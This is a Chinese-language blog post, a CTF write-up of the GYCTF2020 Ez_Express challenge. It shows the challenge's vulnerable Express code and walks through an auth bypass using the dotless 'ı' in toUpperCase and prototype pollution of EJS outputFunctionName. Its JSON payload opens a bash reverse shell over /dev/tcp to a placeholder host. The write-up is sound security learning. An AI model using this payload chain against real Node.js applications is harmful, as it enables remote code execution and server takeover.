@@ -1,0 +1,209 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>GYCTF2020 Ez_Express | Sk1y's Blog</title><meta name="keywords" content="nodejs,原型链污染"><meta name="author" content="Sk1y"><meta name="copyright" content="Sk1y"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[GYCTF2020]Ez_Express源码泄露文件泄露www.zip 主要逻辑在routes&#x2F;index.js  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172v">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GYCTF2020 Ez_Express">
+<meta property="og:url" content="https://sk1y233.github.io/2022/10/26/GYCTF2020-Ez-Express/index.html">
+<meta property="og:site_name" content="Sk1y&#39;s Blog">
+<meta property="og:description" content="[GYCTF2020]Ez_Express源码泄露文件泄露www.zip 主要逻辑在routes&#x2F;index.js  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172v">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2022-10-26T14:50:29.000Z">
+<meta property="article:modified_time" content="2022-10-26T15:00:23.588Z">
+<meta property="article:author" content="Sk1y">
+<meta property="article:tag" content="nodejs">
+<meta property="article:tag" content="原型链污染">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://sk1y233.github.io/2022/10/26/GYCTF2020-Ez-Express/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'GYCTF2020 Ez_Express',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-10-26 23:00:23'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Sk1y's Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122029920.jpg" onerror="onerror=null;src='https://github.com/Sk1y233/blog-img/blob/main/images/202207121312215.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友联</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Sk1y's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友联</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">GYCTF2020 Ez_Express</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-26T14:50:29.000Z" title="发表于 2022-10-26 22:50:29">2022-10-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-26T15:00:23.588Z" title="更新于 2022-10-26 23:00:23">2022-10-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">878</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="GYCTF2020 Ez_Express"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h1><h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2><p>文件泄露<code>www.zip</code></p>
+<p>主要逻辑在routes&#x2F;index.js</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221026223143528.png" alt="image-20221026223143528"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;   <span class="comment">// 存在原型链污染</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safeKeyword</span>(<span class="params">keyword</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.<span class="title function_">match</span>(<span class="regexp">/(admin)/i</span>s)) &#123;  <span class="comment">// 不区分大小写</span></span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="property">outputFunctionName</span>=<span class="literal">undefined</span>;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_">safeKeyword</span>(req.<span class="property">body</span>.<span class="property">userid</span>))&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span>=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.<span class="property">body</span>.<span class="property">userid</span>.<span class="title function_">toUpperCase</span>(),   <span class="comment">//好像存在问题</span></span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.<span class="property">body</span>.<span class="property">pwd</span>,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>==req.<span class="property">body</span>.<span class="property">userid</span>&amp;&amp;req.<span class="property">body</span>.<span class="property">pwd</span>==req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">passwd</span>)&#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isLogin</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/action&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>); <span class="comment">// clone 调用merge函数，进行原型链污染</span></span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/info&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.<span class="property">outputFunctionName</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>
+
+<h2 id="toUpperCase"><a href="#toUpperCase" class="headerlink" title="toUpperCase"></a>toUpperCase</h2><p>login路由对应的代码，注册的时候，会使用safeKeyword对userid（也就是用户名进行判断）</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221026223429940.png" alt="image-20221026223429940"></p>
+<p>跟进safeKeyword()函数，发现不能是admin</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">safeKeyword</span>(<span class="params">keyword</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.<span class="title function_">match</span>(<span class="regexp">/(admin)/i</span>s)) &#123;  <span class="comment">// 不区分大小写</span></span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是判断之后，会将userid.toUpperCase()和pwd写入session，在之后的action路由里面，需要userid为<code>ADMIN</code></p>
+<p>这样就产生了一个矛盾：<code>safeKeyword不允许userid存在admin(无论大小写)，action路由需要userid.toUpperCase()为ADMIN</code></p>
+<p>解决的办法：</p>
+<blockquote>
+<p>在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。<br>在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。</p>
+</blockquote>
+<p>所以我们可以让<code>userid=ADMıN</code>，即可过safeKeyword，也会在经过toUpperCase()函数之后，满足<code>ADMIN</code>的条件</p>
+<h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p>action路由，判断userid之后，将req.body传入clone</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221026224157320.png" alt="image-20221026224157320"></p>
+<p>跟进clone(),发现调用merge()函数</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221026224233610.png" alt="image-20221026224233610"></p>
+<p>跟进merge()，是一个典型的原型链污染，具体分析看<a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/124180297?spm=1001.2014.3001.5501"> 原型链污染学习（1）_Sk1y的博客-CSDN博客</a></p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221026224258172.png" alt="image-20221026224258172"></p>
+<p>再来看info路由，返回<code>res.outputFunctionName</code>给模板渲染</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221026224402656.png" alt="image-20221026224402656"></p>
+<p>发现ejs模板引擎，ejs存在原型链污染进行RCE，具体的分析见：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/248170#h2-8">从 Lodash 原型链污染到模板 RCE-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221026224445557.png" alt="image-20221026224445557"></p>
+<p><strong>所以思路就是：先通过action路由对outputFunctionName进行原型链污染，而后通过info路由触发执行命令</strong></p>
+<p>action传参，payload如下</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/7003 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后访问以GET方式访问info，反弹shell</p>
+<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221026205434035.png" alt="image-20221026205434035"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/248170#h2-8">从 Lodash 原型链污染到模板 RCE-安全客 - 安全资讯平台 (anquanke.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/115919976">GYCTF2020]Ez_Express_bfengj的博客-CSDN博客</a></li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://sk1y233.github.io">Sk1y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://sk1y233.github.io/2022/10/26/GYCTF2020-Ez-Express/">https://sk1y233.github.io/2022/10/26/GYCTF2020-Ez-Express/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://sk1y233.github.io" target="_blank">Sk1y's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/nodejs/">nodejs</a><a class="post-meta__tags" href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">原型链污染</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/10/24/Javassist%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='https://github.com/Sk1y233/blog-img/blob/main/images/202207121312821.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Javassist动态编程</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122029920.jpg" onerror="this.onerror=null;this.src='https://github.com/Sk1y233/blog-img/blob/main/images/202207121312215.gif'" alt="avatar"/></div><div class="author-info__name">Sk1y</div><div class="author-info__description">每一个不曾起舞的日子都是对生命的辜负</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Sk1y233"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/atom.xml" target="_blank" title="RSS链接"><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GYCTF2020-Ez-Express"><span class="toc-number">1.</span> <span class="toc-text">[GYCTF2020]Ez_Express</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.</span> <span class="toc-text">源码泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#toUpperCase"><span class="toc-number">1.2.</span> <span class="toc-text">toUpperCase</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.3.</span> <span class="toc-text">原型链污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.4.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/26/GYCTF2020-Ez-Express/" title="GYCTF2020 Ez_Express">GYCTF2020 Ez_Express</a><time datetime="2022-10-26T14:50:29.000Z" title="发表于 2022-10-26 22:50:29">2022-10-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/24/Javassist%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/" title="Javassist动态编程">Javassist动态编程</a><time datetime="2022-10-24T01:58:12.000Z" title="发表于 2022-10-24 09:58:12">2022-10-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/18/ofcms1-1-4-%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ofcms1.1.4 内容管理系统代码审计">ofcms1.1.4 内容管理系统代码审计</a><time datetime="2022-10-18T11:43:57.000Z" title="发表于 2022-10-18 19:43:57">2022-10-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/18/2022bytectf/" title="2022bytectf">2022bytectf</a><time datetime="2022-10-18T00:04:01.000Z" title="发表于 2022-10-18 08:04:01">2022-10-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/17/idea%E5%88%9B%E5%BB%BAmaven%E9%A1%B9%E7%9B%AE%E4%B8%80%E7%9B%B4%E6%98%BE%E7%A4%BAloading-archetype-list-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" title="idea创建maven项目一直显示loading archetype list...解决方法">idea创建maven项目一直显示loading archetype list...解决方法</a><time datetime="2022-10-17T07:11:01.000Z" title="发表于 2022-10-17 15:11:01">2022-10-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By Sk1y</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span 